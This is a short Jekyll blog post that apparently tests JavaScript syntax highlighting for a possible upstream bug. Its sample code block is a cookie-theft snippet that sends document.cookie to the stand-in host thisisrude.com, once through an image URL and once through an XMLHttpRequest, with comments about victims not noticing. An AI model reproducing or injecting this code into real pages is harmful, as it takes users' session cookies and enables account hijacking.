---
layout: post
title: JavaScript Syntax Highlighting
subtitle: possible upstream bug
---

This is a codeblock.

{% highlight javascript linenos %}

let yourCookie = encode(document.cookie);

// retrieve an image from the server, but send the victim's cookies as well.
let url = `http://thisisrude.com/picture.jpg?cookie=${yourCookie}`;
document.getElementById('image').src = url;

// AJAX - Unnoticed by the typical user.

// string template https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
url = `http://thisisrude.com/gimmie?cookie=${yourCookie}`;
let xhr = new XMLHttpRequest();
xhr.open('GET', url, true);
xhr.send();

{% endhighlight %}

